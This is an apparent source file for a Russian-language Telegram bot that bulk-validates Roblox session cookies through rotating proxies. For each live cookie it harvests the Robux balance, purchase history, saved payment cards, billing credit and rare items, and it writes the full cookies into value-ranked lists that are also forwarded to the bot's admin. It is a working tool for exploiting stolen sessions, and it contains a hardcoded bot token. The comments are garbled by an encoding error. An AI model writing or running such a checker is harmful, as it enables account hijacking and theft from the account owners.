import os
import json
import logging
import random
import threading
import asyncio
import aiohttp
import zipfile
import queue
import time
from datetime import date, datetime, timedelta
from collections import defaultdict
from pytz import timezone
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, InputMediaDocument,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.enums import ParseMode
import telebot

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
ADMINS = [6440521056]  # –°–ø–∏—Å–æ–∫ ID –∞–¥–º–∏–Ω–æ–≤
BOT_TOKEN = '8335283399:AAFpXJAxw54Bilr3FMAuwJtmS7fv4q_wcsU'
DATABASE_DIR = 'Users/'
COOKIE_FILES_DIR = 'filesforcookie/'
PROXIES_FILE = 'proxies.txt'
TARGET_ITEMS = [
    131592085,    # Headless Horseman
    139610147,    # Korblox Deathspeaker
    10159600649,  # 8-Bit Royal Crown
    494291269,    # Super Super Happy Face
    10159610478,  # 8-Bit HP Bar
    1365767       # Valkyrie Helm
]
MAX_RETRIES = 5
CONCURRENT_CHECKS = 50
REQUEST_TIMEOUT = 10

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è –Ω–∞–∑–≤–∞–Ω–∏–π —Ä–µ–¥–∫–∏—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤
RARE_ITEMS_NAMES = {
    131592085: "Headless Horseman",
    139610147: "Korblox Deathspeaker",
    10159600649: "8-Bit Royal Crown",
    494291269: "Super Super Happy Face",
    10159610478: "8-Bit HP Bar",
    1365767: "Valkyrie Helm"
}

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
check_queue = queue.Queue()
current_checking = None  # –¢–µ–∫—É—â–∏–π –ø—Ä–æ–≤–µ—Ä—è–µ–º—ã–π —Ñ–∞–π–ª (user_id, file_info)
queue_status = {}  # –°—Ç–∞—Ç—É—Å –æ—á–µ—Ä–µ–¥–∏ {user_id: position}
sent_queue_notifications = {}  # –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π {user_id: last_notification_position}
active_tasks = set()  # –ú–Ω–æ–∂–µ—Å—Ç–≤–æ –∞–∫—Ç–∏–≤–Ω—ã—Ö –∑–∞–¥–∞—á –ø—Ä–æ–≤–µ—Ä–∫–∏
queue_task = None  # –ó–∞–¥–∞—á–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—á–µ—Ä–µ–¥–∏
validator_queue = queue.Queue()
current_validator_checking = None  # –¢–µ–∫—É—â–∏–π –ø—Ä–æ–≤–µ—Ä—è–µ–º—ã–π —Ñ–∞–π–ª –≤ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–µ
validator_queue_status = {}  # –°—Ç–∞—Ç—É—Å –æ—á–µ—Ä–µ–¥–∏ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞
validator_sent_notifications = {}  # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞
validator_active_tasks = set()  # –ê–∫—Ç–∏–≤–Ω—ã–µ –∑–∞–¥–∞—á–∏ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞
validator_task = None  # –ó–∞–¥–∞—á–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—á–µ—Ä–µ–¥–∏ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞

os.makedirs(DATABASE_DIR, exist_ok=True)
os.makedirs(COOKIE_FILES_DIR, exist_ok=True)

class Database:
    @staticmethod
    def register_user(user_id: int, username: str = None) -> tuple:
        user_path = f'{DATABASE_DIR}{user_id}'
        is_new = False
        if not os.path.exists(user_path):
            os.makedirs(f'{user_path}/logs', exist_ok=True)
            is_new = True
            
            config = {
                'cookie_check_count': 0,
                'registration_date': str(date.today()),
                'badges': None,
                'gamepasses': None,
                'username': username,
                'last_activity': str(datetime.now()),
                'total_checks': 0,
                'valid_cookies_found': 0,
                'invalid_cookies_found': 0
            }
            with open(f'{user_path}/config.json', 'w') as f:
                json.dump(config, f, indent=4)
        
        return user_path, is_new

    @staticmethod
    def get_user_config(user_id: int):
        user_path, _ = Database.register_user(user_id)
        with open(f'{user_path}/config.json', 'r') as f:
            return json.load(f)

    @staticmethod
    def update_config(user_id: int, key: str, value):
        user_path, _ = Database.register_user(user_id)  # –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–æ
        config = Database.get_user_config(user_id)
        config[key] = value
        config['last_activity'] = str(datetime.now())
        with open(f'{user_path}/config.json', 'w') as f:
            json.dump(config, f, indent=4)

    @staticmethod
    async def send_startup_message():
        try:  # ‚Üê –î–æ–±–∞–≤–ª–µ–Ω–æ –¥–≤–æ–µ—Ç–æ—á–∏–µ
            # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
            users = Database.get_all_users()
            for user_id in users:
                try:
                    await bot.send_message(user_id, "üëã")
                    await bot.send_message(user_id, "–ë–æ—Ç –≤–∫–ª—é—á–µ–Ω, –Ω–∞—Å–ª–∞–∂–¥–∞–π—Ç–µ—Å—å")
                except Exception as e:
                    logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}: {e}")

            # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–æ–≤
            for admin_id in ADMINS:
                try:
                    await bot.send_message(
                        admin_id,
                        f"üü¢ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!\n"
                        f"‚è∞ –í—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
                        f"üë• –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {len(users)}"
                    )
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å—Ç–∞—Ç—É—Å–∞ –∞–¥–º–∏–Ω—É {admin_id}: {e}")
                    
        except Exception as e:  # ‚Üê –ò—Å–ø—Ä–∞–≤–ª–µ–Ω –æ—Ç—Å—Ç—É–ø
            logging.error(f"–û—à–∏–±–∫–∞ –≤ startup —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è—Ö: {e}")

    @staticmethod
    def save_proxies(proxies: list):
        with open(PROXIES_FILE, 'w') as f:
            f.write('\n'.join(proxies))

    @staticmethod
    def load_proxies() -> list:
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    @staticmethod
    def get_all_users() -> list:
        users = []
        for user_id in os.listdir(DATABASE_DIR):
            if user_id.isdigit():
                users.append(int(user_id))
        return users

    @staticmethod
    def ban_user(user_id: int, reason: str):
        banned_users = Database.load_banned_users()
        banned_users[str(user_id)] = {
            'reason': reason,
            'date': str(date.today()),
            'admin': ADMINS[0]  # ID –ø–µ—Ä–≤–æ–≥–æ –∞–¥–º–∏–Ω–∞
        }
        with open(f'{DATABASE_DIR}banned_users.json', 'w') as f:
            json.dump(banned_users, f, indent=4)

    @staticmethod
    def unban_user(user_id: int):
        banned_users = Database.load_banned_users()
        if str(user_id) in banned_users:
            del banned_users[str(user_id)]
            with open(f'{DATABASE_DIR}banned_users.json', 'w') as f:
                json.dump(banned_users, f, indent=4)

    @staticmethod
    def load_banned_users() -> dict:
        if os.path.exists(f'{DATABASE_DIR}banned_users.json'):
            with open(f'{DATABASE_DIR}banned_users.json', 'r') as f:
                try:
                    return json.load(f)
                except json.JSONDecodeError:
                    return {}
        return {}

    @staticmethod
    def is_user_banned(user_id: int) -> bool:
        banned_users = Database.load_banned_users()
        return str(user_id) in banned_users

    @staticmethod
    def get_ban_reason(user_id: int) -> str:
        banned_users = Database.load_banned_users()
        ban_info = banned_users.get(str(user_id), {})
        return ban_info.get('reason', '–ü—Ä–∏—á–∏–Ω–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞')

class Form(StatesGroup):
    gamepass = State()
    badge = State()
    file = State()
    support_message = State()
    admin_reply = State()
    validator_file = State() 

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()

semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)

async def send_startup_message():
    users = Database.get_all_users()
    for user_id in users:
        try:
            await bot.send_message(user_id, "üëã")
            await bot.send_message(user_id, "–ë–æ—Ç –≤–∫–ª—é—á–µ–Ω, –Ω–∞—Å–ª–∞–∂–¥–∞–π—Ç–µ—Å—å")
        except Exception as e:
            logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}: {e}")

async def log_to_admin(action: str, user_id: int, username: str = None):
    message = (
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username if username else 'none'} (ID: {user_id})\n"
        f"‚è∞ –í—Ä–µ–º—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"üí† –î–µ–π—Å—Ç–≤–∏–µ: {action}"
    )
    for admin_id in ADMINS:
        try:
            await bot.send_message(admin_id, message)
        except Exception as e:
            logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É {admin_id}: {e}")

async def get_all_time_donate(session: aiohttp.ClientSession, cookie: str, user_id: int, proxy: str = None):
    total_donate = 0
    cursor = ""
    proxy_url = f"http://{proxy}" if proxy else None
    while True:
        try:
                url = f'https://economy.roblox.com/v2/users/{user_id}/transactions'
                params = {
                    "limit": 100,
                    "transactionType": "Purchase",
                    "itemPricingType": "All",
                    "cursor": cursor
                }

                async with session.get(
                    url,
                    params=params,
                    cookies={".ROBLOSECURITY": cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 429:
                        await asyncio.sleep(5)
                        continue

                    data = await response.json()
                    transactions = data.get('data', [])

                    for transaction in transactions:
                        total_donate += transaction.get('currency', {}).get('amount', 0)

                    cursor = data.get('nextPageCursor')
                    if not cursor:
                        break
        except: pass
    if total_donate != 0:
        total_donate = str(total_donate).strip('-')
    return int(total_donate)

async def get_pending_and_donate(cookie: str, user_id: int, proxy: str = None):
    url = f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url,
                cookies={".ROBLOSECURITY": cookie.strip()},
                allow_redirects=False,
                proxy=f"http://{proxy}" if proxy else None,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 200 and response.content_type == 'application/json':
                    data = await response.json()
                    donate = data.get('purchasesTotal', 0)
                    if donate != 0:
                        donate = str(donate).strip('-')
                    pending = data.get('pendingRobuxTotal', 0)
                    return {
                        "donate": int(donate),
                        "pending": pending
                    }
                else:
                    return {"donate": 0, "pending": 0}
    except Exception as e:
        logging.error(f"Error fetching pending and donate: {e}")
        return {"donate": 0, "pending": 0}

async def check_billing(session: aiohttp.ClientSession, cookie: str, proxy: str = None):
    billing_url = 'https://billing.roblox.com/v1/credit'
    try:
        async with session.get(
            billing_url, 
            cookies={".ROBLOSECURITY": cookie},
            proxy=f"http://{proxy}" if proxy else None,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            if response.status == 200:
                data = await response.json()
                balance = data.get('balance', 0)
                currency_code = data.get('currencyCode', 'USD')
                return f"{balance/100:.2f} {currency_code}"
            else:
                return "error"
    except Exception as e:
        logging.error(f"Billing check error: {e}")
        return "error"

async def check_cookie_with_retry(session: aiohttp.ClientSession, cookie: str, badges: list, gamepasses: list, proxies: list):
    retries = 0
    last_error = None
    used_proxies = set()
    
    while retries < MAX_RETRIES:
        proxy = None
        if proxies:
            available_proxies = [p for p in proxies if p not in used_proxies]
            if available_proxies:
                proxy = random.choice(available_proxies)
                used_proxies.add(proxy)
            else:
                used_proxies.clear()
                continue
        
        try:
            async with semaphore:
                result = await check_cookie(session, cookie, badges, gamepasses, proxy)
                if result['status'] == 'valid':
                    return result
                else:
                    last_error = result.get('message', 'Invalid cookie')
        except Exception as e:
            last_error = str(e)
            logging.warning(f"Attempt {retries+1} failed (proxy: {proxy}): {e}")
        
        retries += 1
        if retries < MAX_RETRIES:
            await asyncio.sleep(1)
    
    logging.error(f"All attempts failed: {last_error}")
    return {'status': 'invalid', 'message': last_error}

async def check_cookie(session: aiohttp.ClientSession, cookie: str, badges: list, gamepasses: list, proxy: str = None):
    try:
        proxy_url = f"http://{proxy}" if proxy else None
        
        async with session.get(
            'https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            proxy=proxy_url
        ) as response:
            if response.status == 401:
                return {'status': 'invalid'}
            if response.status != 200:
                return {'status': 'invalid'}
            
            user_data = await response.json()
            user_id = user_data['id']
            
        async with session.get(
            f'https://users.roblox.com/v1/users/{user_id}',
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            if response.status == 200:
                user_info = await response.json()
                created_str = user_info.get('created')
                creation_date = 'Unknown'
                if created_str:
                    try:
                        dt = datetime.fromisoformat(created_str.replace('Z', '+00:00'))
                        creation_date = dt.strftime('%d.%m.%Y')
                    except:
                        pass
            else:
                creation_date = 'Unknown'
        
        async with session.get(
            'https://www.roblox.com/my/settings/json',
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            settings = await response.json()
            
        async with session.get(
            'https://economy.roblox.com/v1/user/currency',
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            balance_data = await response.json()
            balance = balance_data.get('robux', 0)
            
        pending_donate_data = await get_pending_and_donate(cookie, user_id, proxy)
        donate = pending_donate_data["donate"]
        pending = pending_donate_data["pending"]
            
        # –ü–æ–ª—É—á–∞–µ–º All-time donate
        all_time_donate = await get_all_time_donate(session, cookie, user_id, proxy)
            
        premium = settings.get('IsPremium', False)
        
        card_url = 'https://apis.roblox.com/payments-gateway/v1/payment-profiles'
        async with session.get(
            card_url,
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            cards = await response.json()
            card = "Last4Digits" in str(cards)
        
        badges_result = []
        if badges:
            for badge in badges:
                while True:
                    try:
                        async with session.get(
                            f'https://inventory.roblox.com/v1/users/{user_id}/items/2/{badge}/is-owned',
                            cookies={'.ROBLOSECURITY': cookie},
                            proxy=proxy_url,
                            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                        ) as response:
                            response = await response.text()
                            if response.lower() == 'true':
                                async with session.get(
                                        f"https://badges.roblox.com/v1/badges/{badge}",
                                        cookies={'.ROBLOSECURITY': cookie},
                                        proxy=proxy_url,
                                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as name:
                                    name = await name.json()
                                    if name:
                                        badges_result.append(name['name'])
                                        break
                            else:
                                break
                    except Exception as e:
                        print(e)
            badges_result = ', '.join(badges_result) if badges_result else []

        gamepasses_result = []
        if gamepasses:
            for gp in gamepasses:
                while True:
                    try:
                        async with session.get(
                                f'https://inventory.roblox.com/v1/users/{user_id}/items/1/{gp}/is-owned',
                                cookies={'.ROBLOSECURITY': cookie},
                                proxy=proxy_url,
                                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                        ) as response:
                            response = await response.text()
                            if response.lower() == 'true':
                                async with session.get(
                                        f"https://apis.roblox.com/game-passes/v1/game-passes/{gp}/product-info",
                                        cookies={'.ROBLOSECURITY': cookie},
                                        proxy=proxy_url,
                                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as name:
                                    name = await name.json()
                                    if name:
                                        gamepasses_result.append(name['Name'])
                                        break
                            else:
                                break
                    except Exception as e:
                        print(e)
            gamepasses_result = ', '.join(gamepasses_result) if gamepasses_result else []
        print(gamepasses_result)
        rap = await check_rap(session, user_id, proxy)
        
        rare_items = {}
        for item_id in TARGET_ITEMS:
            async with session.get(
                f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{item_id}',
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                data = await response.json()
                if data.get('data', []):
                    rare_items[item_id] = len(data['data'])
        
        billing = await check_billing(session, cookie, proxy)
        
        return {
            'status': 'valid',
            'username': settings.get('Name', 'Unknown'),
            'balance': balance,
            'pending': pending,
            'donate': donate,
            'all_time_donate': all_time_donate,
            'premium': premium,
            'card': card,
            'cards_count': 1 if card else 0,
            'email': settings.get('UserEmailVerified', False),
            'creation_date': creation_date,
            'badges': badges_result,
            'gamepasses': gamepasses_result,
            'rap': rap,
            'rare_items': rare_items,
            'billing': billing,
            'cookie': cookie,
            'proxy_used': proxy
        }
        
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def check_rap(session: aiohttp.ClientSession, user_id: int, proxy: str = None):
    total_rap = 0
    next_cursor = None
    proxy_url = f"http://{proxy}" if proxy else None
    
    try:
        while True:
            url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100&sortOrder=Asc'
            if next_cursor:
                url += f'&cursor={next_cursor}'
            
            async with session.get(
                url,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 429:
                    await asyncio.sleep(1)
                    continue
                    
                data = await response.json()
                
                for item in data.get('data', []):
                    total_rap += item.get('recentAveragePrice', 0)
                
                next_cursor = data.get('nextPageCursor')
                if not next_cursor:
                    break
                    
    except Exception as e:
        logging.error(f"RAP check error: {e}")
    
    return total_rap

async def check_cookie_simple(session: aiohttp.ClientSession, cookie: str, proxies: list = None):
    retries = 0
    last_error = None
    used_proxies = set()
    
    while retries < MAX_RETRIES:
        proxy = None
        if proxies:
            available_proxies = [p for p in proxies if p not in used_proxies]
            if available_proxies:
                proxy = random.choice(available_proxies)
                used_proxies.add(proxy)
            else:
                used_proxies.clear()
                continue
        
        try:
            async with semaphore:
                result = await check_cookie_basic(session, cookie, proxy)
                if result['status'] == 'valid':
                    return result
                else:
                    last_error = result.get('message', 'Invalid cookie')
        except Exception as e:
            last_error = str(e)
            logging.warning(f"Attempt {retries+1} failed (proxy: {proxy}): {e}")
        
        retries += 1
        if retries < MAX_RETRIES:
            await asyncio.sleep(1)
    
    logging.error(f"All attempts failed: {last_error}")
    return {'status': 'invalid', 'message': last_error}

async def check_cookie_basic(session: aiohttp.ClientSession, cookie: str, proxy: str = None):
    try:
        proxy_url = f"http://{proxy}" if proxy else None
        
        async with session.get(
            'https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            proxy=proxy_url
        ) as response:
            if response.status == 401:
                return {'status': 'invalid'}
            if response.status != 200:
                return {'status': 'invalid'}
            
            return {'status': 'valid', 'cookie': cookie}
            
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def create_report_files(stats: dict, user_id: int, timestamp: str):
    user_dir = f'{DATABASE_DIR}{user_id}/checks/{timestamp}/'
    os.makedirs(user_dir, exist_ok=True)

    def create_file(filename, data):
        path = f'{user_dir}{filename}.txt'
        config = Database.get_user_config(user_id)
        badges_enabled = config.get('badges') is not None
        gamepasses_enabled = config.get('gamepasses') is not None
        
        with open(path, 'w', encoding='utf-8') as f:
            for item in data:
                premium_str = 'true' if item['premium'] else 'false'
                card_str = 'true' if item['card'] else 'false'
                mail_str = 'true' if item['email'] else 'false'
                cards_count_str = str(item['cards_count'])
                billing_str = item.get('billing', 'error')
                
                badges_str = 'none'
                if badges_enabled:
                    badges_str = item['badges'] if item['badges'] else 'None'
                
                gamepasses_str = 'none'
                if gamepasses_enabled:
                    gamepasses_str = item['gamepasses'] if item['gamepasses'] else 'None'
                
                rare_items_str = 'none'
                if item['rare_items']:
                    rare_items_str = ', '.join([f"{RARE_ITEMS_NAMES.get(int(item_id), f'Item {item_id}')} ({count})" for item_id, count in item['rare_items'].items()])
                
                line = (
                    f"Name: {item['username']} | "
                    f"Id: {user_id} | "
                    f"Balance: {item['balance']} | "
                    f"Pending: {item['pending']} | "
                    f"Donate: {abs(item['donate'])} | "
                    f"All-time donate: {abs(item['all_time_donate'])} | "
                    f"RAP: {item['rap']} | "
                    f"Billing: {billing_str} | "
                    f"Premium: {premium_str} | "
                    f"Badges: {badges_str} | "
                    f"Passes: {gamepasses_str} | "
                    f"Cards: {card_str} | "
                    f"Mail: {mail_str} | "
                    f"2FA: False | "
                    f"Trade: False | "
                    f"Creation year: {item['creation_date'].split('.')[-1]} | "
                    f"Rare Items: {rare_items_str} | "
                    f"Cookie: {item['cookie']}\n"
                )
                f.write(line)
        return path if os.path.getsize(path) > 0 else None

    files = {}
    if stats['valid_list']:
        files['valid'] = create_file('Valid', stats['valid_list'])
    if stats['total_all_time_donate']:
        files['donate'] = create_file('All_Time_Donate', sorted(stats['all_time_donate_list'], key=lambda x: x['all_time_donate'], reverse=True))
    if stats['balance_list']:
        files['balance'] = create_file('Balance', sorted(stats['balance_list'], key=lambda x: x['balance'], reverse=True))
    if stats['cards_list']:
        files['cards'] = create_file('Cards', stats['cards_list'])
    if stats['badges_list']:
        files['badges'] = create_file('Badges', stats['badges_list'])
    if stats['gamepasses_list']:
        files['gamepasses'] = create_file('Gamepasses', stats['gamepasses_list'])
    if stats['pending_list']:
        files['pending'] = create_file('Pending', sorted(stats['pending_list'], key=lambda x: x['pending'], reverse=True))
    if stats['nomail_list']:
        files['nomail'] = create_file('Nomail', stats['nomail_list'])
    if stats['rap_list']:
        files['rap'] = create_file('RAP', sorted(stats['rap_list'], key=lambda x: x['rap'], reverse=True))
    if stats['rare_items_list']:
        files['rare_items'] = create_file('RareItems', stats['rare_items_list'])
    
    return {k: v for k, v in files.items() if v is not None}

async def generate_report_text(stats: dict, start_time: float):
    rare_items_summary = []
    for item in stats['rare_items_list']:
        if item['rare_items']:
            for item_id, count in item['rare_items'].items():
                item_name = RARE_ITEMS_NAMES.get(int(item_id), f'Item {item_id}')
                rare_items_summary.append(f"{item_name} ({count})")
    
    rare_items_text = ", ".join(rare_items_summary) if rare_items_summary else "–ù–µ—Ç —Ä–µ–¥–∫–∏—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤"
    
    # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ –¥–ª—è –±–∏–ª–ª–∏–Ω–≥–∞
    billing_summary = []
    for currency, amount in stats['total_billing'].items():
        billing_summary.append(f"{amount:.2f} {currency}")
    billing_text = " + ".join(billing_summary) if billing_summary else "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö"
    
    # –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
    duration = time.time() - start_time
    minutes = int(duration // 60)
    seconds = int(duration % 60)
    duration_text = f"{minutes} –º–∏–Ω {seconds} —Å–µ–∫" if minutes > 0 else f"{seconds} —Å–µ–∫"
    
    # –ü–æ–ª—É—á–∞–µ–º –º–æ—Å–∫–æ–≤—Å–∫–æ–µ –≤—Ä–µ–º—è
    moscow_tz = timezone('Europe/Moscow')
    moscow_time = datetime.now(moscow_tz).strftime("%Y-%m-%d %H:%M:%S (MSK)")

    return (
        f'üìä <b>–û–¢–ß–ï–¢ –ü–†–û–í–ï–†–ö–ò</b>\n\n'
        f'ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n'
        f'üîπ <b>–û–±—â–∏–µ –¥–∞–Ω–Ω—ã–µ:</b>\n\n'
        f'[‚úÖ] ‚Ä¢ –í–∞–ª–∏–¥–Ω—ã—Ö - <b>{stats["valid"]}</b>\n'
        f'[‚ùå] ‚Ä¢ –ù–µ –≤–∞–ª–∏–¥–Ω—ã—Ö - <b>{stats["invalid"]}</b>\n'
        f'[‚ôªÔ∏è] ‚Ä¢ Ô∏è–î—É–±–ª–∏–∫–∞—Ç–æ–≤ - <b>{stats.get("duplicates", 0)}</b>\n\n'
        f'[üí∞] ‚Ä¢ –û–±—â–∏–π –¥–æ–Ω–∞—Ç -  <b>{abs(stats["total_donate"])} R$</b>\n'
        f'[üí∏] ‚Ä¢ All-time –¥–æ–Ω–∞—Ç - <b>{abs(stats["total_all_time_donate"])} R$</b>\n'
        f'[üíµ] ‚Ä¢ –û–±—â–∏–π –±–∞–ª–∞–Ω—Å - <b>{stats["total_balance"]} R$</b>\n'
        f'[üîÑ] ‚Ä¢ –û–±—â–∏–π –ø–µ–Ω–¥–∏–Ω–≥ - <b>{stats["total_pending"]} R$</b>\n'
        f'[üè∑Ô∏è] ‚Ä¢ –û–±—â–∏–π RAP - <b>{stats["total_rap"]} R$</b>\n\n'
        f'[üí≥] ‚Ä¢ –ö–∞—Ä—Ç - <b>{stats["total_cards"]}</b>\n'
        f'[üåü] ‚Ä¢ –ü—Ä–µ–º–∏—É–º - <b>{stats["premium"]}</b>\n'
        f'[üì´Ô∏è] ‚Ä¢ –ë–µ–∑ –ø–æ—á—Ç—ã - <b>{len(stats["nomail_list"])}</b>\n\n'
        f'[üéñÔ∏è] ‚Ä¢Ô∏è –ë–µ–π–¥–∂–µ–π - <b>{stats["badges_found"]}</b>\n'
        f'[üéÆ] ‚Ä¢ –ì–µ–π–º–ø–∞—Å—Å–æ–≤ - <b>{stats["gamepasses_found"]}</b>\n\n'
        f'[üí≥] ‚Ä¢ –ë–∏–ª–∏–Ω–≥ - <b>{billing_text}</b>\n\n'
        f'[üéÅ] ‚Ä¢ –†–µ–¥–∫–∏–µ –ø—Ä–µ–¥–º–µ—Ç—ã - <b>{rare_items_text}</b>\n\n'
        f'‚è± –í—Ä–µ–º—è –Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏: <b>{moscow_time}</b>\n'
        f'‚è≥ –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: <b>{duration_text}</b>\n'
        f'ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå'
    )

async def send_report_with_files(chat_id: int, report_text: str, files: dict):
    if not files:
        await bot.send_message(chat_id, report_text, parse_mode=ParseMode.HTML)
        return

    try:
        media_group = []
        for i, (file_type, file_path) in enumerate(files.items()):
            caption = report_text if i == 0 else None
            media_group.append(
                InputMediaDocument(
                    media=FSInputFile(file_path),
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
            )
        
        await bot.send_media_group(chat_id, media=media_group)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –º–µ–¥–∏–∞ –≥—Ä—É–ø–ø—ã: {e}")
        await bot.send_message(chat_id, report_text, parse_mode=ParseMode.HTML)
        for path in files.values():
            await bot.send_document(chat_id, document=FSInputFile(path))

async def generate_report(stats: dict, user_id: int, message: Message, start_time: float):
    try:
        timestamp = datetime.now().strftime("%d%m%Y%H%M%S")
        
        files = await create_report_files(stats, user_id, timestamp)
        report_text = await generate_report_text(stats, start_time)
        
        media_group = []
        for i, (file_type, file_path) in enumerate(files.items()):
            caption = report_text if i == 0 else None
            media_group.append(
                InputMediaDocument(
                    media=FSInputFile(file_path),
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
            )
        
        await bot.send_media_group(user_id, media=media_group)
        
        user_config = Database.get_user_config(user_id)
        username = user_config.get('username', 'none')
        
        admin_report = (
            f'üì§ <b>–ù–û–í–ê–Ø –ü–†–û–í–ï–†–ö–ê COOKIE</b>\n\n'
            f'ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n'
            f'üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username} (ID: {user_id})\n\n'
            f'{report_text}'
        )
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç –≤—Å–µ–º –∞–¥–º–∏–Ω–∞–º
        for admin_id in ADMINS:
            await send_report_with_files(admin_id, admin_report, files)
        
        config = Database.get_user_config(user_id)
